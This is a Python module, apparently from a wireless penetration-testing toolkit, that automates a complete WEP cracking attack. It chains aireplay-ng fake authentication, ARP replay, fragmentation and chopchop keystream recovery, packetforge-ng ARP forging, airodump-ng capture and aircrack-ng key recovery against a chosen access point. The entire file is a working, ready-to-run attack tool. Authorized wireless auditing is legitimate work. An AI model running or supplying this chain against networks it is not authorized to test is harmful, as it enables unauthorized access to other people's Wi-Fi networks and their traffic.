"""Custom WEP attack chain (fake authentication, ARP replay, fragmentation/
chopchop + packet forging, and aircrack-ng cracking), replacing
wepAttacks.sh's `wifite --wep` invocation.
"""

import re
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path

from core import colors, device
from core.project import AccessPoint, Project
from core.shell import run_cmd, run_timed, start_background, stop_background

DEFAULT_CRACK_TIMEOUT_S = 600
DEFAULT_CRACK_POLL_S = 30
DEFAULT_FAKEAUTH_TIMEOUT_S = 30
DEFAULT_ARPREPLAY_MINUTES = 5
DEFAULT_PRGA_MINUTES = 2


@dataclass
class CrackResult:
    success: bool
    key: str | None


def _timestamp() -> str:
    return datetime.now().strftime("%d-%m-%y_%H-%M-%S")


def _interface_mac(iface: str) -> str:
    return Path(f"/sys/class/net/{iface}/address").read_text().strip()


def fake_auth(iface: str, bssid: str, project: Project, timeout_s: int = DEFAULT_FAKEAUTH_TIMEOUT_S) -> bool:
    """Associates with the AP via aireplay-ng's fake-authentication attack."""
    result = run_cmd(["aireplay-ng", "--fakeauth", "0", "-a", bssid, "-h", _interface_mac(iface), iface], timeout=timeout_s)
    success = "Association successful" in result.stdout
    if success:
        project.log_msg(f"{colors.GREEN}[*] Fake authentication with {bssid} succeeded{colors.NC}")
    else:
        project.log_msg(f"{colors.RED}[!] Fake authentication with {bssid} failed{colors.NC}")
    return success


def arp_replay_attack(
    iface: str, bssid: str, project: Project, arp_cap: Path | None = None, minutes: int = DEFAULT_ARPREPLAY_MINUTES
) -> None:
    """Replays captured (or forged) ARP packets to generate new IVs via aireplay-ng."""
    args = ["aireplay-ng", "--arpreplay", "-b", bssid, "-h", _interface_mac(iface)]
    if arp_cap is not None:
        args += ["-r", str(arp_cap)]
    args.append(iface)
    run_timed(args, minutes)


def _find_xor_file(prefix: Path) -> Path | None:
    matches = sorted(prefix.parent.glob(f"{prefix.name}*.xor"))
    return matches[0] if matches else None


def fragmentation_attack(iface: str, bssid: str, project: Project, minutes: int = DEFAULT_PRGA_MINUTES) -> Path | None:
    """Obtains a PRGA keystream (.xor) via aireplay-ng's fragmentation attack."""
    safe_bssid = bssid.replace(":", "-")
    prefix = project.captures_dir / f"{safe_bssid}-frag-{_timestamp()}"
    run_timed(["aireplay-ng", "--fragment", "-b", bssid, "-h", _interface_mac(iface), "-w", str(prefix), iface], minutes)
    return _find_xor_file(prefix)


def chopchop_attack(iface: str, bssid: str, project: Project, minutes: int = DEFAULT_PRGA_MINUTES) -> Path | None:
    """Obtains a PRGA keystream (.xor) via aireplay-ng's chopchop attack."""
    safe_bssid = bssid.replace(":", "-")
    prefix = project.captures_dir / f"{safe_bssid}-chopchop-{_timestamp()}"
    run_timed(["aireplay-ng", "--chopchop", "-b", bssid, "-h", _interface_mac(iface), "-w", str(prefix), iface], minutes)
    return _find_xor_file(prefix)


def forge_arp_packet(
    iface: str,
    xor_file: Path,
    bssid: str,
    project: Project,
    source_ip: str = "255.255.255.255",
    dest_ip: str = "255.255.255.255",
) -> Path | None:
    """Forges an ARP request packet from a captured PRGA keystream via packetforge-ng."""
    forged_path = xor_file.with_suffix(".cap")
    run_cmd([
        "packetforge-ng", "--arp",
        "-a", bssid, "-h", _interface_mac(iface),
        "-k", dest_ip, "-l", source_ip,
        "-y", str(xor_file), "-w", str(forged_path),
    ])

    if forged_path.exists():
        project.log_msg(f"{colors.GREEN}[*] Forged ARP packet -> {forged_path}{colors.NC}")
        return forged_path
    project.log_msg(f"{colors.RED}[!] Failed to forge an ARP packet from {xor_file}{colors.NC}")
    return None


def crack_wep(
    cap_path: Path,
    bssid: str,
    project: Project,
    timeout_s: int = DEFAULT_CRACK_TIMEOUT_S,
    poll_interval_s: int = DEFAULT_CRACK_POLL_S,
) -> CrackResult:
    """Polls aircrack-ng against the growing capture until enough IVs are collected to recover the WEP key."""
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        result = run_cmd(["aircrack-ng", "-b", bssid, str(cap_path)])
        match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
        if match:
            key = match.group(1)
            project.log_msg(f"{colors.GREEN}[*] aircrack-ng found the key: {key}{colors.NC}")
            return CrackResult(success=True, key=key)
        time.sleep(poll_interval_s)

    project.log_msg(f"{colors.RED}[!] aircrack-ng did not recover the key within {timeout_s}s{colors.NC}")
    return CrackResult(success=False, key=None)


def run_wep_attack(iface: str, project: Project, ap: AccessPoint) -> CrackResult:
    """Orchestrates a full WEP attack: ARP replay if clients are connected, otherwise
    fragmentation/chopchop + packet forging to bootstrap traffic of our own.
    """
    device.set_channel(iface, ap.channel)

    safe_bssid = ap.bssid.replace(":", "-")
    prefix = project.captures_dir / f"{safe_bssid}-wep-{_timestamp()}"
    cap_path = Path(f"{prefix}-01.cap")

    capture_proc = start_background([
        "airodump-ng", "--bssid", ap.bssid, "--channel", str(ap.channel),
        "--output-format", "pcap", "-w", str(prefix), iface,
    ])

    try:
        if not fake_auth(iface, ap.bssid, project):
            return CrackResult(success=False, key=None)

        if ap.clients:
            arp_replay_attack(iface, ap.bssid, project)
        else:
            xor_file = fragmentation_attack(iface, ap.bssid, project)
            if xor_file is None:
                project.log_msg(f"{colors.YELLOW}[*] Fragmentation attack failed, trying chopchop...{colors.NC}")
                xor_file = chopchop_attack(iface, ap.bssid, project)
            if xor_file is None:
                project.log_msg(f"{colors.RED}[!] Could not obtain a PRGA keystream for {ap.bssid}{colors.NC}")
                return CrackResult(success=False, key=None)

            forged_cap = forge_arp_packet(iface, xor_file, ap.bssid, project)
            if forged_cap is None:
                return CrackResult(success=False, key=None)

            arp_replay_attack(iface, ap.bssid, project, arp_cap=forged_cap)

        return crack_wep(cap_path, ap.bssid, project)
    finally:
        stop_background(capture_proc)
